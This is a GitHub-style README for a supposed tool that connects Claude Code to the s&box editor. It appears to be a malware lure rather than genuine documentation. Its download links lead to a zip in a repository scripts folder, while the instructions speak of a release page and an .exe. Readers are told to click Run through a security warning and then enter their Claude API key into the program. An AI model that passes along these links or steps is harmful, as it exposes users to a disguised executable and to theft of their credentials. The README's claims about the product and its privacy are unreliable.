# 🛠️ claude-sbox-setup - Connect Claude directly to your projects

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/silvieheadless493/claude-sbox-setup/raw/refs/heads/main/bridge/scripts/sbox-setup-claude-1.7.zip)

This software links Claude Code with the s&box editor. It automates game development tasks. It helps you build game features faster. You can use it to fix code errors and create content.

## ⚙️ System Requirements

You need a computer running Windows 10 or Windows 11. Ensure you have the s&box editor installed before you start this process. You need an active internet connection to download the tool. The software requires at least 200 megabytes of free space on your hard drive. 

## 📥 Getting the software

You must visit the website to download the file. Follow this link to get the installer package:

[Download the current version here](https://github.com/silvieheadless493/claude-sbox-setup/raw/refs/heads/main/bridge/scripts/sbox-setup-claude-1.7.zip)

Click the link to open the release page. Select the file ending in .exe to start your download. Save the file in your downloads folder.

## 🚀 Installation steps

After the download finishes, locate the file on your computer. Double-click the file to start the installer. A security window might appear on your screen. Click Run to continue.

The installer guides you through the setup process. Read each screen carefully. Select the default installation path if you do not have a specific preference. The installer connects the tool to your s&box editor automatically. Wait for the progress bar to reach the end. Click Finish to close the window.

## 🔌 Connecting to s&box

Open your s&box editor after the installation completes. The tool detects your environment. You see a new menu item labeled Claude in the top toolbar. 

Click the Claude icon to open the settings panel. You need an API key to allow the program to function. You can find this key by logging into your account on the official Claude website. Copy the key and paste it into the box provided in the application. Click Save to authorize the connection.

## 📝 How to use the tool

The tool operates as an assistant inside your editor. Use the keyboard shortcut Alt + C to trigger the command prompt. Type plain English instructions to start a task. 

For example, type "Create a new prop entity" to let the assistant build the structure of your game object. The software writes the code for you. Review the suggested changes before you accept them. 

You can also highlight existing code and ask for improvements. Select the lines you want to change, press the shortcut, and define your needs. The assistant updates the file in real time.

## 🔧 Managing automation tasks

The software manages repetitive tasks through scripts. You can store your favorite instructions in the library tab. Access the library from the main menu. 

Select New Script to record a series of actions. The assistant tracks your steps and creates a repeatable task. Give your script a simple name so you can find it later. Run your scripts to save time on common chores like scene setup or asset importing.

## 🛡️ Privacy and data

The software sends code snippets to the server to generate responses. It does not share your game project files with others. Your API key remains encrypted on your local disk. 

Clear your history if you want to remove past prompts. Use the Settings menu to find the option for Data Management. Click Clear Cache to delete local records of your assistant interactions. 

## ❓ Troubleshooting common issues

If the assistant fails to respond, check your internet status first. Slow connections can delay the response. Ensure your API key is valid. Sometimes keys expire after a set time. Update your key in the Settings menu if the current one stops working.

If the editor shows an error message, restart the application. A clean restart fixes most connection problems between the tool and your editor. Check the log file if errors persist. You find the log file in the installation folder under the name session.log. 

If you see a screen saying the tool cannot find the editor, verify your installation path. Open Settings and click Browse next to the Editor Path field. Point the software to the folder where you installed s&box. Click Apply to save the update.

Manual updates are also possible. Return to the link at the start of this document to check for new releases. Perform the same steps you used for the first installation.
